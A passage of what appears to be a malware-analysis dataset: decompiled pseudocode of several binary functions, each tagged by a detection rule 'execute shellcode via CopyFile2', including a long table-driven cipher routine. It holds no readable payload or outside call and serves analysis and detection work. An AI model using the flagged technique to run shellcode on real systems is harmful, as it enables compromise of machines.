{\ncode_r0x00023101:\n        uVar10 = iVar8 + 0x191U | 0x21590000;\n        iVar8 = fcn.00022a74(arg1, 0x11ea4, 0);\n        bVar1 = false;\n        bVar3 = bVar4;\n        bVar6 = false;\n        if ((iVar8 != 0) || (iVar8 = fcn.000222d0(arg1, 0),  bVar1 = bVar2,  bVar3 = bVar5,  bVar6 = bVar7,  iVar8 != 0)\n           ) goto code_r0x00023234;\n        if (aiStackX24[0] == -1) {\ncode_r0x0002317c:\n            iVar8 = fcn.000265bc(auStack2456, 0x10, 0x229);\n            if (iVar8 == 0) goto code_r0x00023195;\n        }\n        else {\n            iVar8 = fcn.00021828(0xfffffffe, 0xb, aiStackX24, auStack2440);\n            if (iVar8 == 0) {\n                fcn.00021aa0(0xfffffffe, uStack2424);\n                goto code_r0x0002317c;\n            }\n        }\n        fcn.00021a18();\n    }\ncode_r0x00023234:\n    if (uVar10 != 0) {\n        if (bVar1) {\n            fcn.0002233c();\n            fcn.00029844();\n            fcn.000247fc();\n            fcn.00027b6c();\n            fcn.0001609c();\n        }\n        if (bVar3) {\n            fcn.0005f8fc();\n        }\n        if (bVar6) {\n            fcn.000294bc(0xfffffffe);\n            fcn.00029824();\n            fcn.00021a18();\n        }\n    }\n    return uVar10;\n}\n",
        "token_count": 1399
    },
    "000248b4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000248b4(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    ulong *arg3_00;\n    uint *arg1_00;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint32_t auStackX16 [6];\n    int64_t *in_stack_00000028;\n    int32_t *in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint *puStack80;\n    uchar auStack72 [24];\n    \n    arg3_00 = NULL;\n    iVar2 = 0x21590001;\n    puStack80 = NULL;\n    auStackX16[0] = 0;\n    uStack88 = 0;\n    if (arg2 < 100) {\n        uStack84 = 0;\n        *in_stack_00000028 = 0;\n        *in_stack_00000030 = 0;\n        do {\n            iVar3 = arg3_00;\n            if (*(iVar3 * 0x10 + 0x64320) == arg2) {\n                iVar2 = (**(iVar3 * 0x10 + 0x64328))(arg1, arg2);\n                break;\n            }\n            uStack84 = iVar3 + 1;\n            arg3_00 = uStack84;\n        } while (uStack84 < 6);\n    }\n    else {\n        if ((arg4 != 0) && (arg3_00 = fcn.0002b120(arg3, arg4),  arg3_00 == NULL)) {\n            return 0x215901f8;\n        }\n        uStack84 = 0;\n        iVar2 = fcn.000278bc(-(in_stack_00000038 != 0) & arg1, arg2, arg3_00, &uStack88);\n        uVar6 = uStack84;\n        while (arg3_00 != NULL) {\n            puVar1 = *arg3_00;\n            if (arg3_00[3] != arg3_00 + 4) {\n                fcn.0002fc50(arg3_00[3]);\n            }\n            fcn.0002fc50(arg3_00);\n            arg3_00 = puVar1;\n        }\n        if (0x200 < uVar6) {\n            fcn.00031088(0x88b40);\n            if ((*0x7a508 != NULL) && (*0x7a510 != NULL)) {\n                iVar3 = (**0x7a510)();\n                auStackX16[0] = iVar3 + 4;\n                arg1_00 = fcn.0002fbc4(auStackX16[0]);\n                if (arg1_00 != NULL) {\n                    uVar4 = fcn.0002fcf4(uVar6);\n                    *arg1_00 = uVar4;\n                    iVar2 = (**0x7a508)(arg1_00 + 1, auStackX16, puStack80, uVar6);\n                    if ((iVar2 == 0) && (auStackX16[0] < uVar6)) {\n                        uStack88 = uStack88 | 0x80;\n                        fcn.0002fc50(puStack80);\n                        uVar6 = auStackX16[0] + 4;\n                        puStack80 = arg1_00;\n                    }\n                    else {\n                        fcn.0002fc50(arg1_00);\n                        iVar2 = 0;\n                    }\n                }\n            }\n            fcn.00031108(0x88b40);\n        }\n        iVar3 = fcn.000265bc(auStack72, 0x10, 0x227);\n        if (iVar3 == 0) {\n            iVar3 = fcn.0001f810(auStack72, 0x10, uVar6);\n            *in_stack_00000030 = iVar3 + 1;\n            iVar5 = fcn.00060a74(arg1);\n            *in_stack_00000028 = iVar5;\n            if (iVar5 == 0) {\n                *in_stack_00000030 = 0;\n                iVar2 = 0x21590004;\n            }\n            else {\n                iVar3 = fcn.0001f820(auStack72, 0x10, iVar5 + 1, puStack80);\n                *in_stack_00000030 = iVar3 + 1;\n                **in_stack_00000028 = uStack88;\n            }\n        }\n        else {\n            iVar2 = 0x215901f9;\n        }\n    }\n    fcn.0002fc50(puStack80);\n    return iVar2;\n}\n",
        "token_count": 1086
    },
    "000272bc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid fcn.000272bc(ulong arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    uint32_t auStackX8 [4];\n    uint uStackX24;\n    uchar auStack360 [4];\n    uint32_t uStack356;\n    uchar auStack296 [256];\n    ulong var_2h;\n    \n    uStackX24 = 0x100;\n    auStackX8[0] = arg1;\n    iVar2 = fcn.000266fc(7, arg1, auStack296, 0x100);\n    iVar4 = -1;\n    pcVar6 = arg2;\n    do {\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = fcn.000268d0(7, auStackX8[0], arg2, ~iVar4);\n    if ((((iVar3 == 0) && (iVar3 = fcn.00021828(0xfffffffe, 7, auStackX8, auStack360),  iVar3 == 0)) &&\n        (fcn.000219dc(0xfffffffe, 7, uStack356, 0),  iVar2 == 0)) && (iVar4 = fcn.00061b04(auStack296),  iVar4 != 0)) {\n        uVar5 = 0xffffffffffffffff;\n        uVar7 = iVar4 - (*0x20 + -0x128);\n        pcVar6 = arg2;\n        do {\n            if (uVar5 == 0) break;\n            uVar5 = uVar5 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        if (((uVar7 < ~uVar5 - 1) && (arg2[uVar7] == ':')) && (uVar7 != 0)) {\n            fcn.00061a80(arg2);\n        }\n        fcn.000219dc(0xfffffffe, 7, uStack356, 1);\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "00028164": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00028164(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    uint32_t auStackX8 [2];\n    ulong uStackX16;\n    char acStack296 [280];\n    \n    fcn.00031000(0x7a4c8);\n    *0x7a4e8 = 0x88d20;\n    *0x7a4e0 = 0x88d20;\n    *0x7a4f0 = 0;\n    fcn.00031000(0x88b40);\n    fcn.00028038(0, 0, 0, 0, 0, 0, 0);\n    arg1 = 500;\n    do {\n        iVar1 = fcn.00026a28(arg1, acStack296, 0x104, auStackX8);\n        if ((iVar1 == 0) && (acStack296[0] != '\\0')) {\n            fcn.00026a50(arg1, 0x11ef8, 8);\n            uVar2 = fcn.00027c50(acStack296, 0);\n            uStackX16 = 0xfffffffffeced300;\n            (**0x115e0)(0, 0);\n            fcn.00026a50(arg1, acStack296, auStackX8[0]);\n            if ((uVar2 != 0) && (uVar2 != 0x21590206)) {\n                fcn.00026e2c(0xd, uVar2, 0, 0);\n            }\n        }\n        uVar2 = arg1 + 1;\n        arg1 = uVar2;\n    } while (uVar2 < 0x227);\n    return;\n}\n",
        "token_count": 400
    },
    "00029dfc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00029dfc(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg3_00;\n    int64_t iStack80;\n    ulong uStack72;\n    uint64_t uStack64;\n    ulong uStack56;\n    uint uStack48;\n    uchar uStack44;\n    \n    arg2 = arg2 & 0xffffffff;\n    arg3_00 = fcn.0002fbc4(arg4);\n    if (arg3_00 == 0) {\n        fcn.00026e2c(7, 0, 0x21590004, arg2);\n    }\n    else {\n        iVar1 = fcn.000218cc(0xfffffffe, 6, arg3, 0);\n        if (iVar1 == 0) {\n            uStack72 = 0x642a0;\n            uStack48 = 0;\n            uStack44 = 0;\n            iStack80 = 0;\n            uStack64 = arg2 | arg1 << 0x20;\n            uStack56 = 3;\n            fcn.000262e4(&uStack72, arg2, arg3_00, arg4);\n            fcn.0002fc50(arg3_00);\n        }\n        else {\n            fcn.00026e2c(7, 0, iVar1 + 0x191U | 0x21590000, arg2);\n            iStack80 = arg3_00;\n        }\n        fcn.0002fc50(iStack80);\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "0002c248": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0002c248(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint32_t *puVar17;\n    uint32_t uVar18;\n    int64_t iVar19;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    uint64_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint64_t uVar26;\n    uint32_t auStack204 [17];\n    uint32_t auStack136 [18];\n    \n    fcn.00061a56(auStack204 + 1, 0, 0x40);\n    if (0x10 < arg2) {\n        arg2._0_4_ = 0x10;\n    }\n    iVar19 = 0;\n    if (0 < arg2) {\n        do {\n            puVar1 = iVar19 + arg3;\n            iVar19 = iVar19 + 1;\n            auStack204[iVar19] = *puVar1;\n        } while (iVar19 < arg2);\n    }\n    *(arg1 + 0x80) = arg2 < 0xb;\n    uVar25 = *(auStack204[16] * 4 + 0x13460) ^ *(auStack204[15] * 4 + 0x13c60) ^ *(auStack204[14] * 4 + 0x13060) ^\n             *(auStack204[13] * 4 + 0x13860) ^ *(auStack204[9] * 4 + 0x13860) ^\n             (((auStack204[1] << 8 | auStack204[2]) << 8 | auStack204[3]) << 8 | auStack204[4]);\n    uVar16 = uVar25 & 0xff;\n    uVar14 = uVar25 >> 8 & 0xff;\n    uVar21 = uVar25 >> 0x18;\n    uVar11 = uVar25 >> 0x10 & 0xff;\n    uVar18 = *(auStack204[11] * 4 + 0x13c60) ^ *(uVar16 * 4 + 0x13c60) ^ *(uVar14 * 4 + 0x13460) ^\n             *(uVar21 * 4 + 0x13060) ^ *(uVar11 * 4 + 0x13860) ^\n             (((auStack204[9] << 8 | auStack204[10]) << 8 | auStack204[11]) << 8 | auStack204[12]);\n    uVar20 = uVar18 & 0xff;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar3 = *(uVar15 * 4 + 0x13460);\n    uVar13 = uVar18 >> 0x10 & 0xff;\n    uVar4 = *(uVar13 * 4 + 0x13860);\n    uVar5 = *((uVar18 >> 0x18) * 4 + 0x13c60);\n    uVar6 = *(uVar15 * 4 + 0x13c60);\n    uVar24 = *(auStack204[10] * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13060) ^ uVar3 ^ uVar4 ^ uVar5 ^\n             (((auStack204[13] << 8 | auStack204[14]) << 8 | auStack204[15]) << 8 | auStack204[16]);\n    uVar7 = *((uVar24 >> 8 & 0xff) * 4 + 0x13060);\n    uVar15 = uVar24 >> 0x10 & 0xff;\n    uVar8 = *(uVar15 * 4 + 0x13460);\n    uVar12 = *(auStack204[12] * 4 + 0x13460) ^ *((uVar24 & 0xff) * 4 + 0x13860) ^ *((uVar24 >> 0x18) * 4 + 0x13c60) ^\n             uVar7 ^ uVar8 ^ (((auStack204[5] << 8 | auStack204[6]) << 8 | auStack204[7]) << 8 | auStack204[8]);\n    auStack204[1] =\n         *((uVar24 >> 0x18) * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13860) ^ *(uVar14 * 4 + 0x13060) ^ uVar6 ^ uVar8;\n    auStack204[2] = *((uVar24 & 0xff) * 4 + 0x13460) ^ uVar7 ^ uVar3 ^ uVar4 ^ uVar5;\n    uVar3 = *(uVar14 * 4 + 0x13c60);\n    auStack204[3] =\n         *((uVar12 >> 0x10 & 0xff) * 4 + 0x13460) ^ *((uVar12 >> 0x18) * 4 + 0x13060) ^ *(uVar15 * 4 + 0x13860) ^\n         *(uVar16 * 4 + 0x13860) ^ uVar3;\n    auStack204[4] =\n         *((uVar12 >> 8 & 0xff) * 4 + 0x13060) ^ *((uVar12 & 0xff) * 4 + 0x13460) ^ *((uVar12 >> 0x18) * 4 + 0x13c60) ^\n         *(uVar21 * 4 + 0x13c60) ^ *(uVar11 * 4 + 0x13860);\n    uVar24 = *(uVar20 * 4 + 0x13460) ^ *(uVar13 * 4 + 0x13060) ^ *((uVar18 >> 0x18) * 4 + 0x13860) ^\n             *(uVar21 * 4 + 0x13860) ^ uVar6 ^ uVar24;\n    uVar14 = uVar24 & 0xff;\n    uVar4 = *((uVar24 >> 8 & 0xff) * 4 + 0x13460);\n    uVar20 = uVar24 >> 0x10 & 0xff;\n    uVar25 = *((uVar24 >> 0x18) * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13860) ^ *(uVar14 * 4 + 0x13c60) ^ uVar4 ^ uVar3 ^\n             uVar25;\n    uVar3 = *((uVar25 & 0xff) * 4 + 0x13060);\n    uVar5 = *((uVar25 >> 8 & 0xff) * 4 + 0x13460);\n    uVar21 = uVar25 >> 0x10 & 0xff;\n    uVar18 = *((uVar25 >> 0x18) * 4 + 0x13c60) ^ *(uVar21 * 4 + 0x13860) ^ *(uVar11 * 4 + 0x13060) ^ uVar5 ^ uVar3 ^\n             uVar18;\n    uVar22 = uVar18 & 0xff;\n    uVar23 = uVar18 >> 0x18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar13 = uVar18 >> 0x10 & 0xff;\n    uVar12 = *(uVar22 * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13460) ^ *(uVar15 * 4 + 0x13060) ^ *(uVar16 * 4 + 0x13460) ^\n             *(uVar23 * 4 + 0x13c60) ^ uVar12;\n    uVar11 = uVar12 >> 8 & 0xff;\n    uVar16 = uVar12 >> 0x10 & 0xff;\n    uVar6 = *((uVar12 >> 0x18) * 4 + 0x13860);\n    auStack204[5] = *(uVar14 * 4 + 0x13060) ^ *(uVar23 * 4 + 0x13060) ^ *(uVar16 * 4 + 0x13c60) ^ uVar4 ^ uVar6;\n    uVar4 = *(uVar23 * 4 + 0x13860);\n    auStack204[6] =\n         *((uVar24 >> 0x18) * 4 + 0x13460) ^ *(uVar20 * 4 + 0x13060) ^ *(uVar16 * 4 + 0x13460) ^ *(uVar11 * 4 + 0x13860)\n         ^ *((uVar12 & 0xff) * 4 + 0x13c60);\n    uVar24 = *(uVar16 * 4 + 0x13060) ^ *(uVar11 * 4 + 0x13c60) ^ *((uVar12 & 0xff) * 4 + 0x13460) ^ uVar4 ^ uVar6 ^\n             uVar24;\n    uVar20 = uVar24 & 0xff;\n    auStack204[7] = *(uVar14 * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13c60) ^ uVar5 ^ uVar3 ^ uVar4;\n    auStack204[8] =\n         *((uVar25 >> 0x18) * 4 + 0x13460) ^ *(uVar21 * 4 + 0x13060) ^ *((uVar25 & 0xff) * 4 + 0x13c60) ^\n         *(uVar22 * 4 + 0x13c60) ^ *(uVar15 * 4 + 0x13860);\n    uVar16 = uVar24 >> 8 & 0xff;\n    uVar3 = *(uVar16 * 4 + 0x13460);\n    uVar14 = uVar24 >> 0x10 & 0xff;\n    uVar11 = uVar24 >> 0x18;\n    uVar18 = *(uVar15 * 4 + 0x13c60) ^ *(uVar20 * 4 + 0x13c60) ^ *(uVar14 * 4 + 0x13860) ^ *(uVar11 * 4 + 0x13060) ^\n             uVar3 ^ uVar18;\n    uVar21 = uVar18 >> 0x18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar4 = *(uVar15 * 4 + 0x13460);\n    uVar5 = *((uVar18 & 0xff) * 4 + 0x13060);\n    uVar26 = uVar18 >> 0x10 & 0xff;\n    uVar12 = *(uVar13 * 4 + 0x13060) ^ *(uVar26 * 4 + 0x13860) ^ *(uVar21 * 4 + 0x13c60) ^ uVar5 ^ uVar4 ^ uVar12;\n    uVar13 = uVar12 >> 8 & 0xff;\n    uVar23 = uVar12 >> 0x10 & 0xff;\n    uVar25 = *(uVar22 * 4 + 0x13460) ^ *((uVar12 & 0xff) * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13060) ^\n             *(uVar23 * 4 + 0x13460) ^ *((uVar12 >> 0x18) * 4 + 0x13c60) ^ uVar25;\n    uVar6 = *(uVar14 * 4 + 0x13060);\n    auStack204[9] =\n         *((uVar25 >> 0x10 & 0xff) * 4 + 0x13c60) ^ *((uVar25 >> 0x18) * 4 + 0x13860) ^ *(uVar23 * 4 + 0x13060) ^\n         *(uVar20 * 4 + 0x13060) ^ uVar3;\n    uVar3 = *(uVar15 * 4 + 0x13c60);\n    auStack204[10] =\n         *((uVar25 >> 8 & 0xff) * 4 + 0x13860) ^ *((uVar25 & 0xff) * 4 + 0x13c60) ^ *((uVar25 >> 0x18) * 4 + 0x13460) ^\n         *(uVar11 * 4 + 0x13460) ^ uVar6;\n    uVar7 = *(uVar26 * 4 + 0x13060);\n    auStack204[11] =\n         *(uVar23 * 4 + 0x13c60) ^ *((uVar12 >> 0x18) * 4 + 0x13860) ^ *(uVar16 * 4 + 0x13860) ^ uVar5 ^ uVar4;\n    auStack204[12] =\n         *((uVar12 & 0xff) * 4 + 0x13c60) ^ *(uVar13 * 4 + 0x13860) ^ *(uVar21 * 4 + 0x13460) ^ uVar7 ^ uVar3;\n    uVar12 = *((uVar18 & 0xff) * 4 + 0x13460) ^ *(uVar21 * 4 + 0x13860) ^ *(uVar11 * 4 + 0x13860) ^ uVar7 ^ uVar3 ^\n             uVar12;\n    uVar21 = uVar12 & 0xff;\n    uVar14 = uVar12 >> 8 & 0xff;\n    uVar3 = *((uVar12 >> 0x10 & 0xff) * 4 + 0x13860);\n    uVar24 = *((uVar12 >> 0x18) * 4 + 0x13060) ^ *(uVar14 * 4 + 0x13460) ^ *(uVar21 * 4 + 0x13c60) ^\n             *(uVar16 * 4 + 0x13c60) ^ uVar3 ^ uVar24;\n    uVar22 = uVar24 & 0xff;\n    uVar15 = uVar24 >> 8 & 0xff;\n    uVar4 = *((uVar24 >> 0x10 & 0xff) * 4 + 0x13860);\n    uVar5 = *((uVar24 >> 0x18) * 4 + 0x13c60);\n    uVar18 = *(uVar15 * 4 + 0x13460) ^ *(uVar22 * 4 + 0x13060) ^ uVar5 ^ uVar4 ^ uVar6 ^ uVar18;\n    uVar11 = uVar18 >> 8 & 0xff;\n    uVar16 = uVar18 >> 0x18;\n    uVar6 = *(uVar11 * 4 + 0x13060);\n    uVar23 = uVar18 >> 0x10 & 0xff;\n    uVar7 = *(uVar23 * 4 + 0x13460);\n    uVar25 = *((uVar18 & 0xff) * 4 + 0x13860) ^ *(uVar20 * 4 + 0x13460) ^ *(uVar16 * 4 + 0x13c60) ^ uVar7 ^ uVar6 ^\n             uVar25;\n    uVar20 = uVar25 >> 8 & 0xff;\n    uVar13 = uVar25 >> 0x10 & 0xff;\n    uVar8 = *((uVar18 & 0xff) * 4 + 0x13460);\n    uVar9 = *(uVar16 * 4 + 0x13860);\n    auStack204[13] =\n         *(uVar15 * 4 + 0x13c60) ^ *(uVar22 * 4 + 0x13860) ^ *(uVar21 * 4 + 0x13060) ^ *(uVar16 * 4 + 0x13060) ^ uVar7;\n    auStack204[14] = *(uVar22 * 4 + 0x13460) ^ uVar6 ^ uVar5 ^ uVar4 ^ uVar8;\n    uVar4 = *((uVar25 & 0xff) * 4 + 0x13460);\n    auStack204[15] =\n         *(uVar14 * 4 + 0x13c60) ^ *(uVar21 * 4 + 0x13860) ^ *((uVar25 >> 0x18) * 4 + 0x13060) ^ *(uVar13 * 4 + 0x13460)\n         ^ uVar9;\n    auStack204[16] =\n         *((uVar12 >> 0x18) * 4 + 0x13c60) ^ *(uVar13 * 4 + 0x13c60) ^ *(uVar20 * 4 + 0x13060) ^ uVar3 ^ uVar4;\n    uVar12 = *((uVar25 >> 0x18) * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13c60) ^ uVar9 ^ uVar4 ^\n             uVar12;\n    uVar20 = uVar12 & 0xff;\n    uVar15 = uVar12 >> 8 & 0xff;\n    uVar13 = uVar12 >> 0x10 & 0xff;\n    uVar10 = uVar12 >> 0x18;\n    uVar18 = *(uVar11 * 4 + 0x13c60) ^ *(uVar20 * 4 + 0x13c60) ^ *(uVar15 * 4 + 0x13460) ^ *(uVar10 * 4 + 0x13060) ^\n             *(uVar13 * 4 + 0x13860) ^ uVar18;\n    uVar21 = uVar18 & 0xff;\n    uVar16 = uVar18 >> 8 & 0xff;\n    uVar3 = *(uVar16 * 4 + 0x13460);\n    uVar11 = uVar18 >> 0x10 & 0xff;\n    uVar4 = *(uVar11 * 4 + 0x13860);\n    uVar5 = *((uVar18 >> 0x18) * 4 + 0x13c60);\n    uVar25 = *(uVar23 * 4 + 0x13060) ^ *(uVar21 * 4 + 0x13060) ^ uVar3 ^ uVar4 ^ uVar5 ^ uVar25;\n    uVar6 = *((uVar25 >> 8 & 0xff) * 4 + 0x13060);\n    uVar14 = uVar25 >> 0x10 & 0xff;\n    uVar7 = *(uVar14 * 4 + 0x13460);\n    uVar9 = *(uVar16 * 4 + 0x13c60);\n    uVar24 = *((uVar25 & 0xff) * 4 + 0x13860) ^ *((uVar25 >> 0x18) * 4 + 0x13c60) ^ uVar8 ^ uVar6 ^ uVar7 ^ uVar24;\n    auStack136[0] =\n         *((uVar25 >> 0x18) * 4 + 0x13060) ^ *(uVar21 * 4 + 0x13860) ^ *(uVar15 * 4 + 0x13060) ^ uVar9 ^ uVar7;\n    auStack136[1] = *((uVar25 & 0xff) * 4 + 0x13460) ^ uVar6 ^ uVar3 ^ uVar4 ^ uVar5;\n    uVar3 = *(uVar15 * 4 + 0x13c60);\n    auStack136[2] =\n         *((uVar24 >> 0x10 & 0xff) * 4 + 0x13460) ^ *((uVar24 >> 0x18) * 4 + 0x13060) ^ *(uVar14 * 4 + 0x13860) ^\n         *(uVar20 * 4 + 0x13860) ^ uVar3;\n    uVar25 = *(uVar21 * 4 + 0x13460) ^ *(uVar11 * 4 + 0x13060) ^ *((uVar18 >> 0x18) * 4 + 0x13860) ^\n             *(uVar10 * 4 + 0x13860) ^ uVar9 ^ uVar25;\n    auStack136[3] =\n         *((uVar24 >> 8 & 0xff) * 4 + 0x13060) ^ *((uVar24 & 0xff) * 4 + 0x13460) ^ *((uVar24 >> 0x18) * 4 + 0x13c60) ^\n         *(uVar10 * 4 + 0x13c60) ^ *(uVar13 * 4 + 0x13860);\n    uVar11 = uVar25 & 0xff;\n    uVar4 = *((uVar25 >> 8 & 0xff) * 4 + 0x13460);\n    uVar16 = uVar25 >> 0x10 & 0xff;\n    uVar12 = *((uVar25 >> 0x18) * 4 + 0x13060) ^ *(uVar16 * 4 + 0x13860) ^ *(uVar11 * 4 + 0x13c60) ^ uVar4 ^ uVar3 ^\n             uVar12;\n    uVar3 = *((uVar12 & 0xff) * 4 + 0x13060);\n    uVar5 = *((uVar12 >> 8 & 0xff) * 4 + 0x13460);\n    uVar21 = uVar12 >> 0x10 & 0xff;\n    uVar18 = *((uVar12 >> 0x18) * 4 + 0x13c60) ^ *(uVar21 * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13060) ^ uVar5 ^ uVar3 ^\n             uVar18;\n    uVar22 = uVar18 & 0xff;\n    uVar23 = uVar18 >> 0x18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar13 = uVar18 >> 0x10 & 0xff;\n    uVar24 = *(uVar22 * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13460) ^ *(uVar15 * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13460) ^\n             *(uVar23 * 4 + 0x13c60) ^ uVar24;\n    uVar14 = uVar24 >> 8 & 0xff;\n    uVar20 = uVar24 >> 0x10 & 0xff;\n    uVar6 = *((uVar24 >> 0x18) * 4 + 0x13860);\n    uVar7 = *(uVar23 * 4 + 0x13860);\n    auStack136[4] = *(uVar11 * 4 + 0x13060) ^ *(uVar23 * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13c60) ^ uVar4 ^ uVar6;\n    auStack136[5] =\n         *((uVar25 >> 0x18) * 4 + 0x13460) ^ *(uVar16 * 4 + 0x13060) ^ *(uVar20 * 4 + 0x13460) ^ *(uVar14 * 4 + 0x13860)\n         ^ *((uVar24 & 0xff) * 4 + 0x13c60);\n    auStack136[6] = *(uVar11 * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13c60) ^ uVar5 ^ uVar3 ^ uVar7;\n    auStack136[7] =\n         *((uVar12 >> 0x18) * 4 + 0x13460) ^ *(uVar21 * 4 + 0x13060) ^ *((uVar12 & 0xff) * 4 + 0x13c60) ^\n         *(uVar22 * 4 + 0x13c60) ^ *(uVar15 * 4 + 0x13860);\n    uVar25 = *(uVar20 * 4 + 0x13060) ^ *(uVar14 * 4 + 0x13c60) ^ *((uVar24 & 0xff) * 4 + 0x13460) ^ uVar7 ^ uVar6 ^\n             uVar25;\n    uVar20 = uVar25 & 0xff;\n    uVar16 = uVar25 >> 8 & 0xff;\n    uVar3 = *(uVar16 * 4 + 0x13460);\n    uVar14 = uVar25 >> 0x10 & 0xff;\n    uVar11 = uVar25 >> 0x18;\n    uVar18 = *(uVar15 * 4 + 0x13c60) ^ *(uVar20 * 4 + 0x13c60) ^ *(uVar14 * 4 + 0x13860) ^ *(uVar11 * 4 + 0x13060) ^\n             uVar3 ^ uVar18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar21 = uVar18 >> 0x18;\n    uVar4 = *(uVar15 * 4 + 0x13460);\n    uVar5 = *((uVar18 & 0xff) * 4 + 0x13060);\n    uVar26 = uVar18 >> 0x10 & 0xff;\n    uVar24 = *(uVar13 * 4 + 0x13060) ^ *(uVar26 * 4 + 0x13860) ^ *(uVar21 * 4 + 0x13c60) ^ uVar5 ^ uVar4 ^ uVar24;\n    uVar13 = uVar24 >> 8 & 0xff;\n    uVar23 = uVar24 >> 0x10 & 0xff;\n    uVar12 = *(uVar22 * 4 + 0x13460) ^ *((uVar24 & 0xff) * 4 + 0x13860) ^ *(uVar13 * 4 + 0x13060) ^\n             *(uVar23 * 4 + 0x13460) ^ *((uVar24 >> 0x18) * 4 + 0x13c60) ^ uVar12;\n    uVar6 = *(uVar14 * 4 + 0x13060);\n    auStack136[8] =\n         *((uVar12 >> 0x10 & 0xff) * 4 + 0x13c60) ^ *((uVar12 >> 0x18) * 4 + 0x13860) ^ *(uVar23 * 4 + 0x13060) ^\n         *(uVar20 * 4 + 0x13060) ^ uVar3;\n    uVar3 = *(uVar15 * 4 + 0x13c60);\n    auStack136[9] =\n         *((uVar12 >> 8 & 0xff) * 4 + 0x13860) ^ *((uVar12 & 0xff) * 4 + 0x13c60) ^ *((uVar12 >> 0x18) * 4 + 0x13460) ^\n         *(uVar11 * 4 + 0x13460) ^ uVar6;\n    uVar7 = *(uVar26 * 4 + 0x13060);\n    auStack136[10] =\n         *(uVar23 * 4 + 0x13c60) ^ *((uVar24 >> 0x18) * 4 + 0x13860) ^ *(uVar16 * 4 + 0x13860) ^ uVar5 ^ uVar4;\n    auStack136[11] =\n         *((uVar24 & 0xff) * 4 + 0x13c60) ^ *(uVar13 * 4 + 0x13860) ^ *(uVar21 * 4 + 0x13460) ^ uVar7 ^ uVar3;\n    uVar24 = *((uVar18 & 0xff) * 4 + 0x13460) ^ *(uVar21 * 4 + 0x13860) ^ *(uVar11 * 4 + 0x13860) ^ uVar7 ^ uVar3 ^\n             uVar24;\n    uVar15 = uVar24 & 0xff;\n    uVar11 = uVar24 >> 8 & 0xff;\n    uVar3 = *((uVar24 >> 0x10 & 0xff) * 4 + 0x13860);\n    uVar25 = *((uVar24 >> 0x18) * 4 + 0x13060) ^ *(uVar11 * 4 + 0x13460) ^ *(uVar15 * 4 + 0x13c60) ^\n             *(uVar16 * 4 + 0x13c60) ^ uVar3 ^ uVar25;\n    uVar16 = uVar25 & 0xff;\n    uVar13 = uVar25 >> 8 & 0xff;\n    uVar4 = *((uVar25 >> 0x18) * 4 + 0x13c60);\n    uVar5 = *((uVar25 >> 0x10 & 0xff) * 4 + 0x13860);\n    uVar18 = *(uVar13 * 4 + 0x13460) ^ *(uVar16 * 4 + 0x13060) ^ uVar4 ^ uVar5 ^ uVar6 ^ uVar18;\n    uVar6 = *((uVar18 >> 8 & 0xff) * 4 + 0x13060);\n    uVar14 = uVar18 >> 0x18;\n    uVar7 = *((uVar18 >> 0x10 & 